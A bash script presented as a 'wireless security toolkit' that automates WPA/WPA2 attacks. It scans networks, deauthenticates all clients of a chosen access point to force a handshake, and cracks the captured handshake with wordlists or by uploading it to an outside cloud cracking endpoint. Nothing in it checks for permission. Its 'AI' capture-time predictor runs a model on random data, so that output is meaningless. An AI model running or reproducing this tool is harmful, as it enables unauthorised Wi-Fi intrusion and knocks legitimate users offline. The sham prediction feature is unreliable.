#!/bin/bash
# AeroCrack-NG+ v1.3 - Next-Gen Wireless Security Toolkit
# License: GPLv3
# Dependencies: aircrack-ng, airmon-ng, airodump-ng, aireplay-ng, iw, ethtool, macchanger, tshark, curl, jq, python3, cap2hccapx (from hashcat-utils)

set -eo pipefail
shopt -s nullglob nocasematch

# --- ASCII Banner ---
function show_banner() {
  cat << "EOF"

 █████╗ ███████╗██████╗  ██████╗ ██████╗ ██████╗  █████╗ ██╗  ██╗██╗  ██╗
██╔══██╗██╔════╝██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔══██╗██║ ██╔╝██║ ██╔╝
███████║█████╗  ██████╔╝██║     ██║   ██║██████╔╝███████║█████╔╝ █████╔╝
██╔══██║██╔══╝  ██╔══██╗██║     ██║   ██║██╔══██╗██╔══██║██╔═██╗ ██╔═██╗
██║  ██║███████╗██║  ██║╚██████╗╚██████╔╝██║  ██║██║  ██║██║  ██╗██║  ██╗
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
                      Next-Gen Wireless Security Toolkit v1.3
--------------------------------------------------------------------------------
EOF
}

# --- Configuration ---
VERSION="1.3"
CONFIG_DIR="/etc/aerocrack"
SESSION_DIR="/var/lib/aerocrack/sessions"
# Default wordlists, user can add more or specify one at runtime
DEFAULT_WORDLISTS=("$CONFIG_DIR/wordlists/rockyou.txt" "/usr/share/wordlists/rockyou.txt" "/usr/share/wordlists/fern-wifi/common.txt")
AI_MODEL="$CONFIG_DIR/models/handshake_predictor.h5" # Path to a Keras .h5 model
LOG_FILE="/var/log/aerocrack.log"

# Initialize directories
mkdir -p "$CONFIG_DIR/wordlists" "$CONFIG_DIR/models" "$SESSION_DIR"
touch "$LOG_FILE" # Ensure log file exists

# --- Logging System ---
function log() {
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] $*" | tee -a "$LOG_FILE"
}

# --- Dependency Check ---
function check_dependencies() {
    log "INFO: Checking dependencies..."
    local missing_deps=0
    declare -a deps=("aircrack-ng" "airmon-ng" "airodump-ng" "aireplay-ng" "iw" "ethtool" "macchanger" "tshark" "curl" "jq" "python3" "cap2hccapx")

    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            log "ERROR: Dependency '$dep' not found."
            missing_deps=1
        fi
    done

    if [[ "$missing_deps" -eq 1 ]]; then
        log "ERROR: Please install missing dependencies and try again." >&2
        exit 1
    fi
    log "INFO: All dependencies are satisfied."
}

# --- Hardware Detection ---
function detect_wireless_ifaces() {
    declare -gA WIRELESS_IFACES # Make it globally available for this call
    WIRELESS_IFACES=() # Reset for each call
    log "INFO: Detecting wireless interfaces..."
    while IFS= read -r line; do
        local iface=$(echo "$line" | awk '{print $1}')
        local driver
        # Attempt to get driver info, may fail if ethtool doesn't support the interface fully
        driver=$(ethtool -i "$iface" 2>/dev/null | grep 'driver:' | awk '{print $2}') || driver="unknown"
        WIRELESS_IFACES["$iface"]="$driver"
        log "INFO: Detected interface: $iface (Driver: $driver)"
    done < <(iw dev | awk '/Interface/{print $2}')

    if [[ ${#WIRELESS_IFACES[@]} -eq 0 ]]; then
        log "ERROR: No wireless interfaces found. Ensure your wireless card is connected and drivers are loaded." >&2
        echo -e "\033[31m[!] ERROR: No wireless interfaces found. Exiting.\033[0m" >&2
        exit 1
    fi
}

# --- Core Wireless Functions ---
function start_monitor() {
    local iface="$1"
    local mon_iface_default="${iface}mon" # Default naming convention

    # Check if already in monitor mode or if monitor interface exists
    if iw dev "$iface" info &>/dev/null && iw dev "$iface" info | grep -q "type monitor"; then
        log "INFO: Interface $iface is already in monitor mode."
        echo "$iface" # Return the existing monitor interface name
        return 0
    fi

    # Check for existing monitor interface (e.g. wlan0mon created from wlan0)
    if iw dev "$mon_iface_default" info &>/dev/null && iw dev "$mon_iface_default" info | grep -q "type monitor"; then
        log "INFO: Monitor interface $mon_iface_default already exists."
        # Ensure conflicting processes are killed for this existing monitor interface
        log "INFO: Running airmon-ng check kill for $mon_iface_default..."
        airmon-ng check kill &>> "$LOG_FILE"
        echo "$mon_iface_default"
        return 0
    fi
    
    log "INFO: Enabling monitor mode on $iface."
    echo -e "\033[34m[*] Enabling monitor mode on $iface...\033[0m"
    # Kill interfering processes
    airmon-ng check kill &>> "$LOG_FILE"
    
    # Attempt to start monitor mode and capture the new interface name
    local output
    output=$(airmon-ng start "$iface" 2>&1 | tee -a "$LOG_FILE")
    
    # Try to find the monitor interface name from output (more robust)
    # Example output: (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
    local mon_iface
    mon_iface=$(echo "$output" | grep -oP '(?<=\[phy[0-9]+\])\w+(?= on \[phy[0-9]+\]\w+mon)|(?<=monitor mode vif enabled for \S+ on )\S+')
    
    if [[ -z "$mon_iface" ]]; then
        # Fallback if complex regex fails, try simple grep for "mon" suffixed interface
        mon_iface=$(iw dev | awk '/Interface/ && /mon/{print $2}' | grep "^${iface}mon" | head -n1)
    fi

    if [[ -n "$mon_iface" ]] && iw dev "$mon_iface" info &>/dev/null && iw dev "$mon_iface" info | grep -q "type monitor"; then
        log "INFO: Monitor mode enabled successfully on $mon_iface."
        echo "$mon_iface"
        return 0
    else
        log "ERROR: Failed to start monitor mode on $iface. Output: $output"
        echo -e "\033[31m[!] ERROR: Failed to start monitor mode on $iface.\033[0m" >&2
        return 1
    fi
}

function stop_monitor() {
    local mon_iface="$1"
    if [[ -z "$mon_iface" ]]; then
        log "WARN: No monitor interface specified to stop."
        return 1
    fi

    if iw dev "$mon_iface" info &>/dev/null && iw dev "$mon_iface" info | grep -q "type monitor"; then
        log "INFO: Disabling monitor mode on $mon_iface."
        echo -e "\033[34m[*] Disabling monitor mode on $mon_iface...\033[0m"
        airmon-ng stop "$mon_iface" &>> "$LOG_FILE" || {
            log "ERROR: Failed to stop monitor mode on $mon_iface."
            echo -e "\033[31m[!] ERROR: Failed to stop monitor mode on $mon_iface.\033[0m" >&2
            return 1
        }
        log "INFO: Monitor mode disabled on $mon_iface."
    else
        log "INFO: Interface $mon_iface is not in monitor mode or does not exist."
    fi
}


function scan_networks() {
    local mon_iface="$1"
    local scan_time="${2:-30}" # Default scan time 30 seconds
    local scan_file_base="${SESSION_DIR}/aerocrack_scan_$(date +%Y%m%d_%H%M%S)"
    
    log "INFO: Starting network scan on $mon_iface for ${scan_time}s. Output base: $scan_file_base"
    echo -e "\033[34m[*] Scanning for networks on $mon_iface for ${scan_time}s... (Ctrl+C to stop early)\033[0m"
    
    # Start airodump-ng
    # Using --write-interval 1 to ensure CSV is updated frequently for parsing
    airodump-ng --output-format csv --write-interval 1 -w "$scan_file_base" "$mon_iface" &>> "$LOG_FILE" &
    local pid=$!
    
    # Wait for scan_time, allow early exit with Ctrl+C
    sleep "$scan_time" &
    local sleep_pid=$!
    wait "$sleep_pid" 2>/dev/null # Suppress job control messages for sleep

    # Terminate airodump-ng
    if kill -0 $pid 2>/dev/null; then # Check if process exists
        kill -INT "$pid" 2>/dev/null # Send SIGINT first for graceful shutdown
        sleep 2 # Give it a moment to close files
        if kill -0 $pid 2>/dev/null; then # If still running
            kill -TERM "$pid" 2>/dev/null # Send SIGTERM
            sleep 1
            if kill -0 $pid 2>/dev/null; then
                kill -KILL "$pid" 2>/dev/null # Force kill
            fi
        fi
    fi
    wait "$pid" 2>/dev/null # Wait for process to fully terminate & reap

    local csv_file="${scan_file_base}-01.csv"
    if [[ ! -f "$csv_file" ]]; then
        log "ERROR: Scan output file $csv_file not found."
        echo -e "\033[31m[!] ERROR: Scan output file not found.\033[0m" >&2
        return 1
    fi

    log "INFO: Processing scan results from $csv_file"
    # Process results: BSSID, Channel, Encryption, RSSI, ESSID
    # Extended awk to handle commas in ESSIDs better if possible, and extract more info
    # The part of the CSV with APs starts after a line like "BSSID, First time seen, ..."
    # The client list starts after "Station MAC, First time seen, ..."
    awk -F, '
    BEGIN {ap_section=0}
    /BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key/ {ap_section=1; next}
    /Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs/ {ap_section=0; next}
    (ap_section==1 && length($1) == 17 && $1 != "BSSID") {
        essid=$14
        for(i=15;i<=NF;i++) essid = essid","$i # Handle ESSIDs with commas
        gsub(/^"|"$/,"",essid); # Remove surrounding quotes if any
        print $1"|"$4"|"$6"|"$9"|"$essid # BSSID|Channel|Privacy|Power|ESSID
    }' "$csv_file" 2>/dev/null | sort -t'|' -k4 -nr # Sort by Power (RSSI)
}

# --- AI-Assisted Handshake Prediction ---
function predict_handshake_duration() {
    local mon_iface="$1" # Unused in dummy model, but would be for feature extraction
    local bssid="$2"     # Unused
    local channel="$3"   # Unused
    local base_timeout="${4:-120}" # Default base timeout if AI fails or not used
    
    log "INFO: [AI] Attempting to predict handshake capture duration for $bssid on Ch $channel."
    echo -e "\033[34m[AI] Predicting optimal handshake capture window...\033[0m"
    
    if [[ ! -f "$AI_MODEL" ]]; then
        log "WARN: [AI] Model file '$AI_MODEL' not found. Using default timeout."
        echo -e "\033[33m[!] AI Model not found. Using default timeout: ${base_timeout}s\033[0m"
        echo "$base_timeout"
        return
    fi

    # This is a PLACEHOLDER for actual AI model invocation.
    # A real implementation would need to:
    # 1. Capture relevant network features (e.g., traffic rate, client count, signal strength).
    # 2. Preprocess these features into the format expected by the model.
    # 3. Run the TensorFlow/Keras model.
    local prediction
    prediction=$(python3 <<EOF
import sys
try:
    import tensorflow as tf
    import numpy as np
    model = tf.keras.models.load_model('$AI_MODEL', compile=False) # compile=False speeds up loading if not training
    # DUMMY DATA: Replace with actual feature extraction and preprocessing
    # The shape (1, 100, 5) is arbitrary and depends on your model's input_shape
    # Features could be: time series of packet counts, signal strengths, etc.
    num_features = model.input_shape[2] if len(model.input_shape) == 3 else model.input_shape[1]
    num_timesteps = model.input_shape[1] if len(model.input_shape) == 3 else 1

    if len(model.input_shape) == 3: # e.g. (batch, timesteps, features)
        sample_data = np.random.rand(1, num_timesteps, num_features).astype(np.float32)
    else: # e.g. (batch, features)
        sample_data = np.random.rand(1, num_features).astype(np.float32)
    
    pred_raw = model.predict(sample_data)
    # Assuming model outputs a value that can be scaled to seconds
    # This scaling is highly dependent on your model's output range and meaning
    predicted_duration = int(pred_raw[0][0] * $base_timeout) # Example scaling
    # Ensure prediction is within a reasonable range (e.g., 10s to base_timeout)
    predicted_duration = max(10, min(predicted_duration, $base_timeout))
    print(predicted_duration)
except ImportError:
    sys.stderr.write("TensorFlow not installed.\n")
    sys.exit(1) # Signal error to shell
except Exception as e:
    sys.stderr.write(f"AI Prediction Error: {e}\n")
    sys.exit(1) # Signal error to shell
EOF
    )

    if [[ $? -ne 0 ]] || [[ -z "$prediction" ]]; then
        log "WARN: [AI] Prediction script failed or returned empty. Using default timeout: ${base_timeout}s."
        echo -e "\033[33m[!] AI prediction failed. Using default timeout: ${base_timeout}s\033[0m"
        echo "$base_timeout"
    else
        log "INFO: [AI] Predicted optimal capture window: ${prediction}s."
        echo -e "\033[32m[AI] Optimal capture window: ${prediction}s\033[0m"
        echo "$prediction"
    fi
}

# --- Cloud Cracking Integration ---
function cloud_crack_handshake() {
    local hccapx_file="$1"
    # Example API endpoint - THIS IS HYPOTHETICAL
    local CLOUD_CRACK_API_URL="https://api.example-cloudcrack.com/upload"
    local wordlist_name="${2:-rockyou}" # Example parameter for cloud service
    
    if [[ ! -f "$hccapx_file" ]]; then
        log "ERROR: [CloudCrack] Handshake file '$hccapx_file' not found."
        echo -e "\033[31m[!] Handshake file not found for cloud cracking.\033[0m"
        return 1
    fi

    log "INFO: [CloudCrack] Uploading $hccapx_file for cloud cracking (wordlist: $wordlist_name)."
    echo -e "\033[34m[*] Uploading to cloud cracking service (wordlist: $wordlist_name)...\033[0m"
    
    # Using curl to upload. The API details (parameters, auth) are highly dependent on the service.
    local response
    response=$(curl -s -X POST -F "file=@$hccapx_file" -F "wordlist=$wordlist_name" "$CLOUD_CRACK_API_URL")
    
    if [[ $? -ne 0 ]]; then
        log "ERROR: [CloudCrack] Upload failed (curl error)."
        echo -e "\033[31m[!] Cloud cracking upload failed.\033[0m"
        return 1
    fi
    
    # Assuming the API returns JSON with a task_url or status
    local task_url
    task_url=$(echo "$response" | jq -r '.task_url // empty') # Get .task_url, or empty if not found
    local status
    status=$(echo "$response" | jq -r '.status // empty')

    if [[ -n "$task_url" ]]; then
        log "INFO: [CloudCrack] Task submitted. Monitor at: $task_url"
        echo -e "\033[32m[+] Cloud task started. Monitor at: $task_url\033[0m"
    elif [[ -n "$status" ]]; then
        log "INFO: [CloudCrack] Task status: $status. Response: $response"
        echo -e "\033[32m[+] Cloud task status: $status\033[0m"
    else
        log "ERROR: [CloudCrack] Upload response unclear or failed. Response: $response"
        echo -e "\033[31m[!] Cloud cracking task submission failed or response unclear.\033[0m"
        return 1
    fi
}

# --- Attack & Capture Functions ---
function perform_wpa_attack() {
    local target_bssid="$1"
    local target_channel="$2"
    local attack_interface="$3" # This should be the non-monitor interface
    local wordlist_choice="$4"  # Path to wordlist or "cloud"

    local mon_iface
    mon_iface=$(start_monitor "$attack_interface")
    if [[ $? -ne 0 ]] || [[ -z "$mon_iface" ]]; then
        log "ERROR: Failed to start monitor mode for WPA attack. Aborting."
        return 1
    fi

    log "INFO: WPA Attack on BSSID $target_bssid, Channel $target_channel, Interface $mon_iface"

    # Handshake Capture
    local capture_timeout # Duration for airodump-ng capture
    capture_timeout=$(predict_handshake_duration "$mon_iface" "$target_bssid" "$target_channel" "120") # 120s base
    
    local handshake_file_base="${SESSION_DIR}/handshake_${target_bssid//:/}_$(date +%Y%m%d_%H%M%S)"
    local cap_file="${handshake_file_base}-01.cap" # airodump-ng appends -01.cap
    local hccapx_file="${handshake_file_base}.hccapx"

    log "INFO: Starting handshake capture on $mon_iface for $target_bssid. Timeout: ${capture_timeout}s. Output base: $handshake_file_base"
    echo -e "\033[34m[*] Capturing handshake for BSSID $target_bssid on channel $target_channel (max ${capture_timeout}s)...\033[0m"
    airodump-ng -c "$target_channel" --bssid "$target_bssid" -w "$handshake_file_base" "$mon_iface" &>> "$LOG_FILE" &
    local airodump_pid=$!

    # Send deauthentication packets to encourage handshake
    # Run in background and give it a few seconds
    ( sleep 5 # Wait a bit for airodump to start properly
      log "INFO: Sending deauthentication packets to $target_bssid via $mon_iface."
      echo -e "\033[34m[*] Sending deauthentication packets (3 bursts)...\033[0m"
      # Deauth all clients of the AP to maximize chances. Use with caution.
      aireplay-ng --deauth 5 -a "$target_bssid" "$mon_iface" &>> "$LOG_FILE" 
    ) &
    local deauth_bg_pid=$!

    # Wait for capture duration or until handshake is detected (advanced: use pyrit to check in loop)
    # For simplicity, just wait the predicted time
    sleep "$capture_timeout" &
    local sleep_capture_pid=$!
    wait "$sleep_capture_pid" 2>/dev/null

    if kill -0 $airodump_pid 2>/dev/null; then
      kill -INT $airodump_pid 2>/dev/null
      sleep 1
      kill -TERM $airodump_pid 2>/dev/null
    fi
    wait $airodump_pid 2>/dev/null

    # Clean up deauth background job if it's still running
    if kill -0 $deauth_bg_pid 2>/dev/null; then
        kill $deauth_bg_pid 2>/dev/null
        wait $deauth_bg_pid 2>/dev/null
    fi
    
    # Verify and convert handshake
    if [[ ! -f "$cap_file" ]]; then
        log "ERROR: Capture file $cap_file was not created."
        echo -e "\033[31m[!] Handshake capture file not found. Capture may have failed.\033[0m"
        stop_monitor "$mon_iface"
        return 1
    fi

    log "INFO: Attempting to convert $cap_file to $hccapx_file"
    if cap2hccapx "$cap_file" "$hccapx_file" &>> "$LOG_FILE"; then
        # Additional check with aircrack-ng to see if it's a valid handshake
        if ! aircrack-ng "$hccapx_file" 2>&1 | tee -a "$LOG_FILE" | grep -q "WPA (1 handshake)"; then
             log "WARN: cap2hccapx succeeded, but aircrack-ng doesn't confirm a full handshake in $hccapx_file."
             echo -e "\033[33m[!] Handshake captured and converted to $hccapx_file, but it might be incomplete or invalid.\033[0m"
        else
             log "INFO: Handshake captured and verified: $hccapx_file"
             echo -e "\033[32m[+] Handshake captured successfully and saved to: $hccapx_file\033[0m"
        fi

        # Cracking part
        if [[ "$wordlist_choice" == "cloud" ]]; then
            cloud_crack_handshake "$hccapx_file"
        elif [[ -f "$wordlist_choice" ]]; then
            log "INFO: Starting local cracking of $hccapx_file with wordlist $wordlist_choice"
            echo -e "\033[34m[*] Starting local cracking with wordlist: $wordlist_choice (Ctrl+C to stop)...\033[0m"
            aircrack-ng -w "$wordlist_choice" -b "$target_bssid" "$hccapx_file" | tee -a "$LOG_FILE"
        else
            log "WARN: Invalid wordlist choice '$wordlist_choice'. Skipping cracking."
            echo -e "\033[33m[!] Wordlist '$wordlist_choice' not found. Skipping cracking. Handshake saved.\033[0m"
        fi
    else
        log "ERROR: Failed to convert capture file to .hccapx format. Handshake might be missing."
        echo -e "\033[31m[!] Failed to capture or convert WPA handshake.\033[0m"
        # Optional: Offer to run pyrit analyze or similar for diagnostics
        # tshark -r "$cap_file" -Y "eapol" -c 1 &>/dev/null
        # if [[ $? -eq 0 ]]; then
        #    echo -e "\033[33m[INFO] EAPOL packets were found, but handshake might be incomplete.\033[0m"
        # fi
        stop_monitor "$mon_iface"
        return 1
    fi
    stop_monitor "$mon_iface" # Stop monitor mode after attack attempt
}

function capture_handshake_only() {
    local target_bssid="$1"
    local target_channel="$2"
    local capture_interface="$3" # Non-monitor interface

    local mon_iface
    mon_iface=$(start_monitor "$capture_interface")
    if [[ $? -ne 0 ]] || [[ -z "$mon_iface" ]]; then
        log "ERROR: Failed to start monitor mode for WPA capture. Aborting."
        return 1
    fi

    log "INFO: WPA Handshake Capture ONLY for BSSID $target_bssid, Channel $target_channel, Interface $mon_iface"

    local capture_timeout
    capture_timeout=$(predict_handshake_duration "$mon_iface" "$target_bssid" "$target_channel" "300") # 300s base for dedicated capture
    
    local handshake_file_base="${SESSION_DIR}/capture_only_${target_bssid//:/}_$(date +%Y%m%d_%H%M%S)"
    local cap_file="${handshake_file_base}-01.cap"
    local hccapx_file="${handshake_file_base}.hccapx"

    log "INFO: Starting handshake capture on $mon_iface for $target_bssid. Timeout: ${capture_timeout}s. Output base: $handshake_file_base"
    echo -e "\033[34m[*] Capturing handshake for BSSID $target_bssid on channel $target_channel (max ${capture_timeout}s)...\033[0m"
    echo -e "\033[34m    You may need to manually encourage a client to connect or reconnect to the target AP.\033[0m"
    echo -e "\033[34m    Alternatively, send deauth packets (use another terminal or tool if needed).\033[0m"
    
    airodump-ng -c "$target_channel" --bssid "$target_bssid" -w "$handshake_file_base" "$mon_iface" &>> "$LOG_FILE" &
    local airodump_pid=$!

    # Optional: Prompt user to send deauths manually or trigger client reconnection
    echo -e "\033[33m[*] To force a handshake, try disconnecting and reconnecting a device to the target network,"
    echo -e "    or use aireplay-ng to send deauthentication packets from another terminal:"
    echo -e "    Example: sudo aireplay-ng --deauth 5 -a $target_bssid [-c CLIENT_MAC] $mon_iface \033[0m"
    
    sleep "$capture_timeout" &
    local sleep_capture_pid=$!
    wait "$sleep_capture_pid" 2>/dev/null

    if kill -0 $airodump_pid 2>/dev/null; then
      kill -INT $airodump_pid 2>/dev/null; sleep 1; kill -TERM $airodump_pid 2>/dev/null
    fi
    wait $airodump_pid 2>/dev/null

    if [[ ! -f "$cap_file" ]]; then
        log "ERROR: Capture file $cap_file was not created."
        echo -e "\033[31m[!] Handshake capture file not found.\033[0m"
        stop_monitor "$mon_iface"
        return 1
    fi

    log "INFO: Attempting to convert $cap_file to $hccapx_file"
    if cap2hccapx "$cap_file" "$hccapx_file" &>> "$LOG_FILE"; then
         if ! aircrack-ng "$hccapx_file" 2>&1 | tee -a "$LOG_FILE" | grep -q "WPA (1 handshake)"; then
             log "WARN: cap2hccapx succeeded, but aircrack-ng doesn't confirm a full handshake in $hccapx_file."
             echo -e "\033[33m[!] Handshake captured and converted to $hccapx_file, but it might be incomplete or invalid.\033[0m"
        else
             log "INFO: Handshake captured and verified: $hccapx_file"
             echo -e "\033[32m[+] Handshake captured successfully and saved to: $hccapx_file\033[0m"
        fi
    else
        log "ERROR: Failed to convert capture file to .hccapx. Original .cap file saved at $cap_file."
        echo -e "\033[31m[!] Failed to convert WPA handshake. Original .cap file: $cap_file\033[0m"
        stop_monitor "$mon_iface"
        return 1
    fi
    stop_monitor "$mon_iface"
}


# --- Menu Functions ---
function select_interface_menu() {
    detect_wireless_ifaces # Populates WIRELESS_IFACES
    if [[ ${#WIRELESS_IFACES[@]} -eq 0 ]]; then
        return 1 # Error already logged by detect_wireless_ifaces
    fi

    echo -e "\n\033[1;36mAvailable Wireless Interfaces:\033[0m"
    local i=1
    declare -A iface_map # Local map for selection
    for iface_name in "${!WIRELESS_IFACES[@]}"; do
        # Check if it's already a monitor interface
        local mode_status=""
        if iw dev "$iface_name" info &>/dev/null && iw dev "$iface_name" info | grep -q "type monitor"; then
             mode_status=" (monitor mode active)"
        fi
        echo "$i. $iface_name (Driver: ${WIRELESS_IFACES[$iface_name]})$mode_status"
        iface_map["$i"]="$iface_name"
        ((i++))
    done

    local choice
    read -rp "Select interface (number): " choice
    SELECTED_INTERFACE="${iface_map[$choice]}" # Assign to global for caller

    if [[ -z "$SELECTED_INTERFACE" ]]; then
        log "WARN: Invalid interface selection."
        echo -e "\033[31m[!] Invalid selection.\033[0m"
        return 1
    fi
    log "INFO: User selected interface: $SELECTED_INTERFACE"
    return 0
}

function select_wordlist_menu() {
    echo -e "\n\033[1;36mSelect Wordlist:\033[0m"
    local i=1
    declare -A wordlist_map
    for w_path in "${DEFAULT_WORDLISTS[@]}"; do
        if [[ -f "$w_path" ]]; then
            echo "$i. $w_path (Default)"
            wordlist_map["$i"]="$w_path"
            ((i++))
        fi
    done
    echo "$i. Use Cloud Cracking Service (if available for attack)"
    wordlist_map["$i"]="cloud"
    ((i++))
    echo "$i. Enter custom wordlist path"
    wordlist_map["$i"]="custom"
    
    local choice
    read -rp "Select wordlist option: " choice
    SELECTED_WORDLIST="${wordlist_map[$choice]}"

    if [[ "$SELECTED_WORDLIST" == "custom" ]]; then
        read -rp "Enter path to custom wordlist: " custom_path
        if [[ -f "$custom_path" ]]; then
            SELECTED_WORDLIST="$custom_path"
        else
            log "WARN: Custom wordlist '$custom_path' not found."
            echo -e "\033[31m[!] Custom wordlist not found.\033[0m"
            SELECTED_WORDLIST="" # Indicate failure
            return 1
        fi
    elif [[ -z "$SELECTED_WORDLIST" ]]; then
        log "WARN: Invalid wordlist selection."
        echo -e "\033[31m[!] Invalid selection.\033[0m"
        return 1
    fi
    log "INFO: User selected wordlist option: $SELECTED_WORDLIST"
    return 0
}

function network_scan_menu() {
    clear
    show_banner
    echo -e "\n\033[1;36mNETWORK SCAN\033[0m"
    
    local selected_scan_iface # Will hold the name of the non-monitor interface
    if ! select_interface_menu; then return; fi
    selected_scan_iface="$SELECTED_INTERFACE" # Get selection from global var

    # If selected interface is already monitor, use it. Otherwise, start monitor mode.
    local mon_iface_for_scan
    if iw dev "$selected_scan_iface" info &>/dev/null && iw dev "$selected_scan_iface" info | grep -q "type monitor"; then
        mon_iface_for_scan="$selected_scan_iface"
        log "INFO: Using existing monitor interface $mon_iface_for_scan for scan."
    else
        mon_iface_for_scan=$(start_monitor "$selected_scan_iface")
        if [[ $? -ne 0 ]] || [[ -z "$mon_iface_for_scan" ]]; then
            log "ERROR: Could not start monitor mode on $selected_scan_iface for scanning."
            return
        fi
    fi

    local scan_duration
    read -rp "Enter scan duration in seconds (e.g., 30, default is 30): " scan_duration
    scan_duration=${scan_duration:-30}
    
    echo -e "\n\033[1;37mScanning networks...\033[0m"
    local scan_results
    scan_results=$(scan_networks "$mon_iface_for_scan" "$scan_duration")
    
    echo -e "\n\033[1;37mDiscovered Networks (BSSID | CHAN | ENCRYPTION | RSSI | ESSID):\033[0m"
    echo -e "\033[32m-----------------------------------------------------------------------\033[0m"
    if [[ -n "$scan_results" ]]; then
        # Header for results
        printf "%-18s | %-4s | %-15s | %-5s | %s\n" "BSSID" "CHAN" "ENCRYPTION" "RSSI" "ESSID"
        echo "-----------------------------------------------------------------------"
        # Data rows
        while IFS='|' read -r bssid chan enc rssi essid; do
            printf "%-18s | %-4s | %-15s | %-5s | %s\n" "$bssid" "$chan" "$enc" "$rssi" "$essid"
        done <<< "$scan_results"
    else
        echo -e "\033[33m[!] No networks found or scan failed.\033[0m"
    fi
    echo -e "\033[32m-----------------------------------------------------------------------\033[0m"
    
    # Stop monitor mode only if this menu started it on a non-monitor interface
    if [[ "$mon_iface_for_scan" != "$selected_scan_iface" ]]; then
        stop_monitor "$mon_iface_for_scan"
    fi
    read -rp "Press Enter to continue..."
}

function wpa_attack_menu() {
    clear
    show_banner
    echo -e "\n\033[1;36mWPA/WPA2 ATTACK (CAPTURE & CRACK)\033[0m"

    local target_bssid target_channel attack_iface wordlist_choice
    read -rp "Enter Target BSSID: " target_bssid
    # Basic BSSID validation
    if ! [[ "$target_bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        echo -e "\033[31m[!] Invalid BSSID format.\033[0m"; return
    fi
    read -rp "Enter Target Channel: " target_channel
    if ! [[ "$target_channel" =~ ^[0-9]+$ ]] || [ "$target_channel" -lt 1 ] || [ "$target_channel" -gt 14 ]; then # Basic channel validation
        echo -e "\033[31m[!] Invalid Channel (should be 1-14 for 2.4GHz, or higher for 5GHz - extend check if needed).\033[0m"; return
    fi

    if ! select_interface_menu; then return; fi
    attack_iface="$SELECTED_INTERFACE"

    if ! select_wordlist_menu; then return; fi
    wordlist_choice="$SELECTED_WORDLIST"

    if [[ -z "$attack_iface" ]] || [[ -z "$wordlist_choice" ]]; then
      echo -e "\033[31m[!] Missing interface or wordlist selection. Aborting attack.\033[0m"
      return
    fi

    perform_wpa_attack "$target_bssid" "$target_channel" "$attack_iface" "$wordlist_choice"
    read -rp "Press Enter to continue..."
}

function capture_handshake_only_menu() {
    clear
    show_banner
    echo -e "\n\033[1;36mCAPTURE WPA/WPA2 HANDSHAKE ONLY\033[0m"

    local target_bssid target_channel capture_iface
    read -rp "Enter Target BSSID: " target_bssid
    if ! [[ "$target_bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        echo -e "\033[31m[!] Invalid BSSID format.\033[0m"; return
    fi
    read -rp "Enter Target Channel: " target_channel
     if ! [[ "$target_channel" =~ ^[0-9]+$ ]] || [ "$target_channel" -lt 1 ] || [ "$target_channel" -gt 14 ]; then
        echo -e "\033[31m[!] Invalid Channel.\033[0m"; return
    fi

    if ! select_interface_menu; then return; fi
    capture_iface="$SELECTED_INTERFACE"
    
    if [[ -z "$capture_iface" ]]; then
      echo -e "\033[31m[!] Missing interface selection. Aborting capture.\033[0m"
      return
    fi

    capture_handshake_only "$target_bssid" "$target_channel" "$capture_iface"
    read -rp "Press Enter to continue..."
}


# --- Main Menu ---
function main_menu() {
    while true; do
        clear
        show_banner
        echo -e "\n\033[1;36mMAIN MENU - AeroCrack-NG+ v$VERSION\033[0m"
        log "INFO: Displaying Main Menu."
        echo -e "1. Scan for Networks"
        echo -e "2. Capture WPA/WPA2 Handshake Only"
        echo -e "3. Attack WPA/WPA2 Network (Capture & Crack)"
        echo -e "4. Change MAC Address (Placeholder)" # TODO: Implement macchanger integration
        echo -e "5. View Log File"
        echo -e "6. Exit"
        
        local choice
        read -rp "Select option: " choice
        case $choice in
            1) network_scan_menu ;;
            2) capture_handshake_only_menu ;;
            3) wpa_attack_menu ;;
            4) echo -e "\033[33m[!] MAC Changer function not yet implemented.\033[0m"; sleep 2 ;;
            5) less "$LOG_FILE" ;; # Simple log viewer
            6) log "INFO: AeroCrack-NG+ v$VERSION exited by user."; exit 0 ;;
            *) log "WARN: Invalid option selected in Main Menu: $choice"; echo -e "\033[31mInvalid option\033[0m"; sleep 1 ;;
        esac
    done
}

# --- Main Execution ---
if [[ $EUID -ne 0 ]]; then
   log "ERROR: This script must be run as root."
   echo -e "\033[31m[!] This script must be run as root. Please use sudo.\033[0m" >&2
   exit 1
fi

# Trap Ctrl+C (SIGINT) and exit gracefully
trap '{ log "WARN: SIGINT received. Exiting..."; echo -e "\n\033[33m[!] Operation cancelled by user. Exiting...\033[0m"; exit 1; }' SIGINT SIGTERM

log "INFO: AeroCrack-NG+ v$VERSION started."
check_dependencies # Check dependencies first
main_menu